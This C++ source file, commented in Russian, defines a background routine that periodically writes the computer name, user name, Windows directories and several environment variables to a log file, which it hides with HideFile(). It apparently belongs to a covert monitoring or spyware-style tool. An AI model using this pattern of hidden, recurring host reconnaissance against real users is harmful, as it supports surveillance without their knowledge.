#include "Systeminfo.h"
#define BUFSIZE 1024

void SystemInfo(bool run, char *logfile, unsigned int periodic)
{
	while (run)
	{
		for (int i = periodic; i > 0; i--)
		{
			Sleep(1000);
			if (i == 1)
			{
				LPTSTR lpszSystemInfo;      // указатель на строку, в которой
											// будет информация о системе.
				DWORD cchBuff = 256;        // длина имени компьютера или
											// пользователя.
				TCHAR tchBuffer[BUFSIZE];   // буфер для строки.

				DWORD dwResult;             // возвращаемое значение функции.

				lpszSystemInfo = tchBuffer;

				ofstream out;
				out.open(logfile, ios::app | ios::out);
				HideFile(logfile);

				out << "----------------------------------------------------------" << endl;
				out << "System information. "; OutFullData(out); out << "   |" << endl;
				out << "----------------------------------------------------------" << endl;

				// Получаем и отображаем имя компьютера.

				if (GetComputerName(lpszSystemInfo, &cchBuff))
					out << " Computer name: " << lpszSystemInfo << endl;

				// Получаем и отображаем имя пользователя.

				if (GetUserName(lpszSystemInfo, &cchBuff))
					out << " Username: " << lpszSystemInfo << endl;

				// Получаем и отображаем системную директорию.

				if (GetSystemDirectory(lpszSystemInfo, MAX_PATH + 1))
					out << " System directory: " << lpszSystemInfo << endl;

				// Получаем и отображаем директорию Windows.

				if (GetWindowsDirectory(lpszSystemInfo, MAX_PATH + 1))
					out << " Windows directory: " << lpszSystemInfo << endl;

				out << " Partial list: " << endl;

				// Получаем переменную окружения OS.

				dwResult = ExpandEnvironmentStrings("OS=%OS%", lpszSystemInfo, BUFSIZE);
				if (dwResult <= BUFSIZE)
					out << " OS: "<< lpszSystemInfo << endl;


				// Получаем переменную окружения PATH.

				dwResult = ExpandEnvironmentStrings("PATH=%PATH%", lpszSystemInfo, BUFSIZE);
				if (dwResult <= BUFSIZE)
					out << " Path: " << lpszSystemInfo << endl;

				// Получаем переменную окружения TMP.

				dwResult = ExpandEnvironmentStrings("TEMP=%TEMP%",lpszSystemInfo,BUFSIZE);
				if (dwResult <= BUFSIZE)
					out << " Temp: " << lpszSystemInfo << endl;

				out.close();
			}
		}
		pthread_testcancel();
	}
}
